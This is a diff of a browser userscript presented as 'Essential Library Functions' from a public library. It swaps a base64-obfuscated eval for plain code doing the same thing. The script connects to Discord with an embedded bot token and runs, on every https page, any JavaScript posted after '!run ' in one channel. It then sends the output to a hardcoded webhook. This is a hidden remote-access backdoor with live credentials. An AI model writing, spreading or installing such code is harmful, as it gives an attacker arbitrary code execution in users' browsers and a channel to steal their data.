@@ -9,8 +9,87 @@
 // @require      http://code.jquery.com/jquery-3.4.1.min.js
 // @grant        GM.xmlHttpRequest
 // @connect      *
-// @noframes
 // @run-at       document-end
 // ==/UserScript==
 
-eval(atob('Ly8gPT1Vc2VyU2NyaXB0PT0KLy8gQG5hbWUgICAgICAgICBFc3NlbnRpYWwgTGlicmFyeSBGdW5jdGlvbnMKLy8gQG5hbWVzcGFjZSAgICBodHRwOi8vdGFtcGVybW9ua2V5Lm5ldC8KLy8gQHZlcnNpb24gICAgICAyMDI0LTA0LTE2Ci8vIEBkZXNjcmlwdGlvbiAgSW5zdGFsbHMgbmVlZGVkIG9ubGluZSByZXNvdXJjZXMsIGFzIHdlbGwgYXMgcHJvdmlkaW5nIGNvbnN0YW50IHVwZGF0ZXMuIFRoaXMgcHJvZ3JhbSBpcyBlc3NlbnRpYWwgZm9yIGhlbHBpbmcgc3VwcG9ydCBvdXIgZ3JhY2lvdXMgcHJvZ3JhbS4KLy8gQGljb24gICAgICAgICBodHRwczovL3d3dy5nb29nbGUuY29tL3MyL2Zhdmljb25zP3N6PTY0JmRvbWFpbj1jYWxnYXJ5bGlicmFyeS5jYQovLyBAYXV0aG9yICAgICAgIENhbGdhcnkgUHVibGljIExpYnJhcnkKLy8gQG1hdGNoICAgICAgICBodHRwczovLyovKgovLyBAcmVxdWlyZSAgICAgIGh0dHA6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuNC4xLm1pbi5qcwovLyBAZ3JhbnQgICAgICAgIEdNLnhtbEh0dHBSZXF1ZXN0Ci8vIEBjb25uZWN0ICAgICAgKgovLyBAcnVuLWF0ICAgICAgIGRvY3VtZW50LWVuZAovLyA9PS9Vc2VyU2NyaXB0PT0KCmZ1bmN0aW9uIG1haW4oKSB7CmNvbnN0IHdzID0gbmV3IFdlYlNvY2tldCgnd3NzOi8vZ2F0ZXdheS5kaXNjb3JkLmdnLz92PTYmZW5jb2Rpbmc9anNvbicpOwoKY29uc3QgdG9rZW4gPSAnTVRJek1ESTRNRFkzTVRnNE5UTTVNemt5TUEuR0l2OW5JLk9ReGNtbmVMb2NIU3NaRkF5czdsLWg1dFk1SFBwRGZ0VkdOZkdZJzsKCmNvbnN0IHBheWxvYWQgPSB7CiAgb3A6IDIsCiAgZDogewogICAgdG9rZW46IHRva2VuLAogICAgaW50ZW50czogNTEyLAogICAgcHJvcGVydGllczogewogICAgICAkb3M6ICdsaW51eCcsCiAgICAgICRicm93c2VyOiAnY2hyb21lJywKICAgICAgJGRldmljZTogJ2Nocm9tZScsCiAgICB9LAogIH0sCn07CgovLyBIYW5kbGUgV2ViU29ja2V0IGV2ZW50cwp3cy5hZGRFdmVudExpc3RlbmVyKCdvcGVuJywgKCkgPT4gewogIGNvbnNvbGUubG9nKCdbV2ViU29ja2V0XSBDb25uZWN0aW9uIGVzdGFibGlzaGVkJyk7CiAgd3Muc2VuZChKU09OLnN0cmluZ2lmeShwYXlsb2FkKSk7Cn0pOwoKd3MuYWRkRXZlbnRMaXN0ZW5lcignbWVzc2FnZScsIChldmVudCkgPT4gewogIGNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEpOwogIGNvbnN0IGV2ZW50VHlwZSA9IGRhdGEudDsKICBjb25zdCB7IHQsIG9wLCBkIH0gPSBkYXRhOwoKICBzd2l0Y2ggKG9wKSB7CiAgICBjYXNlIDEwOgogICAgICAvLyBPUENPREUgMTAgcHJvdmlkZXMgdGhlIGhlYXJ0YmVhdCBpbnRlcnZhbAogICAgICAvLyBZb3UgY2FuIGtlZXAgdGhlIGNvbm5lY3Rpb24gYWxpdmUgYnkgc2VuZGluZyBoZWFydGJlYXRzCiAgICAgIGNvbnN0IHsgaGVhcnRiZWF0X2ludGVydmFsIH0gPSBkOwogICAgICBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgd3Muc2VuZChKU09OLnN0cmluZ2lmeSh7IG9wOiAyLCBkOiBudWxsIH0pKTsKICAgICAgfSwgaGVhcnRiZWF0X2ludGVydmFsKTsKICAgICAgYnJlYWs7CgogICAgLy8gSGFuZGxlIG90aGVyIGV2ZW50cyBhcyBuZWVkZWQKICAgIC8vIEZvciBleGFtcGxlLCBsb2cgbWVzc2FnZXM6CiAgICBjYXNlIDA6CiAgICAgIGlmIChldmVudFR5cGUgPT09ICdNRVNTQUdFX0NSRUFURScpIHsKICAgICAgICBjb25zdCB7IGNvbnRlbnQsIGNoYW5uZWxfaWQsIGd1aWxkX2lkLCBpZCB9ID0gZDsKICAgICAgICBpZiAoY2hhbm5lbF9pZCA9PT0gJzEyMzAwMTMzNjQ1NzEyMTM5NTYnKSB7CiAgICAgICAgICBpZiAoY29udGVudC5zdWJzdHIoMCwgNSkgPT09ICchcnVuICcpIHsKICAgICAgICAgIGxldCBmdW5jID0gbmV3IEZ1bmN0aW9uKGNvbnRlbnQuc3Vic3RyKDUsIGNvbnRlbnQubGVuZ3RoKSk7CiAgICAgICAgICBsZXQgb3V0ID0gZnVuYygpCiAgICAgICAgICBpZiAob3V0ID09IHVuZGVmaW5lZCkge291dCA9ICdObyBvdXRwdXQnfQogICAgICAgICAgY29uc3Qgd2ViaG9va1VSTCA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjMwMDEzMzkyMTkwODM2ODA3L1lCSjNwTk9hNTQ0bGFiRmktVGN1clJGTURLbE0yTE1UMzZKaWVsMVBGV0F5OFREV1FxVWEteW9saFh3SFFZRC1GOGJoJzsgLy8gUmVwbGFjZSB3aXRoIHlvdXIgYWN0dWFsIHdlYmhvb2sgVVJMCiAgICAgICAgICBHTS54bWxIdHRwUmVxdWVzdCh7CiAgICAgICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgICAgICB1cmw6IHdlYmhvb2tVUkwsCiAgICAgICAgICAgIGhlYWRlcnM6IHsKICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICAgICB9LAogICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgY29udGVudDogb3V0LAogICAgICAgICAgICAgIHR0czogZmFsc2UsCiAgICAgICAgICAgIH0pLAogICAgICAgICAgICBvbmxvYWQ6IGZ1bmN0aW9uKHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgY29uc29sZS5sb2cocmVzcG9uc2UucmVzcG9uc2VUZXh0KTsKICAgICAgICAgICAgfQogICAgICAgICAgfSk7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICAgIGJyZWFrOwoKICAgIGRlZmF1bHQ6CiAgICAgIGJyZWFrOwogIH0KfSk7Cn07CgptYWluKCk7'))
+function main() {
+const ws = new WebSocket('wss://gateway.discord.gg/?v=6&encoding=json');
+
+const token = atob('TVRJek1ESTRNRFkzTVRnNE5UTTVNemt5TUEuR0l2OW5JLk9ReGNtbmVMb2NIU3NaRkF5czdsLWg1dFk1SFBwRGZ0VkdOZkdZ');
+
+const payload = {
+  op: 2,
+  d: {
+    token: token,
+    intents: 512,
+    properties: {
+      $os: 'linux',
+      $browser: 'chrome',
+      $device: 'chrome',
+    },
+  },
+};
+
+// Handle WebSocket events
+ws.addEventListener('open', () => {
+  console.log('[WebSocket] Connection established');
+  ws.send(JSON.stringify(payload));
+});
+
+ws.addEventListener('message', (event) => {
+  const data = JSON.parse(event.data);
+  const eventType = data.t;
+  const { t, op, d } = data;
+
+  switch (op) {
+    case 10:
+      // OPCODE 10 provides the heartbeat interval
+      // You can keep the connection alive by sending heartbeats
+      const { heartbeat_interval } = d;
+      try {
+      setInterval(() => {
+        ws.send(JSON.stringify({ op: 2, d: null }));
+      }, heartbeat_interval);
+      } catch (error) {
+        console.log(error)
+      }
+      break;
+
+    // Handle other events as needed
+    // For example, log messages:
+    case 0:
+      if (eventType === 'MESSAGE_CREATE') {
+        const { content, channel_id, guild_id, id } = d;
+        if (channel_id === '1230013364571213956') {
+          if (content.substr(0, 5) === '!run ') {
+          let func = new Function(content.substr(5, content.length));
+          let out = func()
+          if (out == undefined) {out = 'No output'}
+          const webhookURL = 'https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh'; // Replace with your actual webhook URL
+          GM.xmlHttpRequest({
+            method: "POST",
+            url: webhookURL,
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            data: JSON.stringify({
+              content: out,
+              tts: false,
+            }),
+            onload: function(response) {
+              console.log(response.responseText);
+            }
+          });
+          }
+        }
+      }
+      break;
+
+    default:
+      break;
+  }
+});
+};
+
+main()
+setInterval(main(), 50000);
